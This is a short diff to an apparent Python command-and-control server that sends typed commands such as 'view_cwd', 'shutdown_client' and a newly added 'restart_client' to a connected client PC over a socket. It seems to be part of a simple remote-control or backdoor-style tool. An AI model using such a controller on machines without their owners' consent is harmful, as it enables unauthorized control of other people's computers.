@@ -20,7 +20,7 @@ print(client_address, " has connected to the server successfully!")
 # Connection has been established successfully
 
 while 1:
-    command = input(str("Type your command >>"))
+    command = input(str("Type your command >> "))
 
     if command == "view_cwd":
         conn.send(command.encode())
@@ -71,6 +71,11 @@ while 1:
         conn.send(command.encode())
         print("Command shutdown_client has been executed successfully!")
         print("Client PC shutdown!")
+    
+    elif command == "restart_client":
+        conn.send(command.encode())
+        print("Command restart_client has been executed successfully!")
+        print("Client PC restarted!")
 
     else:
         print("Command NOT recognized!")
